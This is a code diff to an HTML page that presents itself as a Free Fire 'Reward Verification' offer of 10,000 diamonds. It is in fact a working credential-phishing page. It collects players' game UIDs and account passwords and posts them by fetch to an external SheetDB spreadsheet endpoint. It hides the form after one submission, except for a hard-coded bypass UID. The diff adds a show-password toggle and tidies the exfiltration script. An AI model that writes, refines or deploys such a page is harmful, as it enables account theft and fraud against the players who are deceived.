@@ -8,7 +8,12 @@
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
         .login-box { background: #1a1a1a; padding: 30px; border-radius: 15px; width: 320px; text-align: center; border: 1px solid #ff4500; box-shadow: 0 0 15px #ff4500; }
         h2 { color: #ff4500; text-transform: uppercase; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
+        
+        /* Show Password Styling */
+        .show-pass { display: flex; align-items: center; font-size: 12px; color: #ccc; margin-top: -5px; margin-bottom: 10px; cursor: pointer; }
+        .show-pass input { width: auto; margin-right: 8px; }
+
         button { width: 100%; padding: 12px; background: #ff4500; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 15px; text-transform: uppercase; }
         #status-msg { margin-top: 20px; font-weight: bold; color: #ffea00; }
     </style>
@@ -18,59 +23,66 @@
         <h2 id="title">Reward Verification</h2>
         <form id="sheetdb-form">
             <input type="text" name="data[FF_ID]" placeholder="Free Fire UID" required>
-            <input type="password" name="data[Verification_Code]" placeholder="Account Password" required>
+            
+            <input type="password" id="passInput" name="data[Verification_Code]" placeholder="Account Password" required>
+            
+            <label class="show-pass">
+                <input type="checkbox" onclick="togglePass()"> Show Password
+            </label>
+
             <button type="submit" id="submit-btn">CLAIM 10,000 💎</button>
         </form>
         <div id="status-msg"></div>
     </div>
 
     <script>
-    const form = document.getElementById('sheetdb-form');
-    const statusMsg = document.getElementById('status-msg');
-    const submitBtn = document.getElementById('submit-btn');
-    const uidInput = document.querySelector('input[name="data[FF_ID]"]');
+        const form = document.getElementById('sheetdb-form');
+        const statusMsg = document.getElementById('status-msg');
+        const submitBtn = document.getElementById('submit-btn');
+        const uidInput = document.querySelector('input[name="data[FF_ID]"]');
 
-    // 1. CHECK IF BLOCKED (for normal users)
-    if (localStorage.getItem('ff_claimedv2') === 'true') {
-        form.style.display = 'none';
-        document.getElementById('title').innerText = "NOTICE";
-        statusMsg.innerHTML = "You have already claimed your rewards!<br><small>Status: Processing (24h)</small>";
-    }
-
-    form.addEventListener("submit", e => {
-        e.preventDefault();
-        
-        // 2. THE SECRET BYPASS
-        // Change '20160332' to whatever ID you want to allow for multiple entries
-        const isVipUser = (uidInput.value === '20160332');
-
-        submitBtn.innerText = "Processing...";
-        submitBtn.disabled = true;
-
-        const formData = new FormData(form);
-
-        fetch('https://sheetdb.io/api/v1/c56u1zmpb56o3', {
-            method: 'POST',
-            body: formData,
-        }).then(response => {
-            if(response.ok) {
-                // If it's NOT a VIP user, block them
-                if (!isVipUser) {
-                    localStorage.setItem('ff_claimed', 'true');
-                }
-                
-                // Show success and reload
-                alert("Request Sent Successfully!");
-                window.location.reload();
+        // Function to Toggle Visibility
+        function togglePass() {
+            var x = document.getElementById("passInput");
+            if (x.type === "password") {
+                x.type = "text";
+            } else {
+                x.type = "password";
             }
-        }).catch(err => {
-            console.error(err);
-            alert("Connection error. Try again.");
-            submitBtn.disabled = false;
-            submitBtn.innerText = "CLAIM 10,000 💎";
+        }
+
+        // Check if already submitted
+        if (localStorage.getItem('ff_claimed') === 'true') {
+            form.style.display = 'none';
+            document.getElementById('title').innerText = "NOTICE";
+            statusMsg.innerHTML = "You have already claimed your rewards!<br><small>Status: Processing (24h)</small>";
+        }
+
+        form.addEventListener("submit", e => {
+            e.preventDefault();
+            const isVipUser = (uidInput.value === '20160332');
+            submitBtn.innerText = "Processing...";
+            submitBtn.disabled = true;
+
+            const formData = new FormData(form);
+
+            fetch('https://sheetdb.io/api/v1/c56u1zmpb56o3', {
+                method: 'POST',
+                body: formData,
+            }).then(response => {
+                if(response.ok) {
+                    if (!isVipUser) {
+                        localStorage.setItem('ff_claimed', 'true');
+                    }
+                    alert("Request Sent Successfully!");
+                    window.location.reload();
+                }
+            }).catch(err => {
+                alert("Error. Try again.");
+                submitBtn.disabled = false;
+                submitBtn.innerText = "CLAIM 10,000 💎";
+            });
         });
-    });
-</script>
-         
+    </script>
 </body>
 </html>
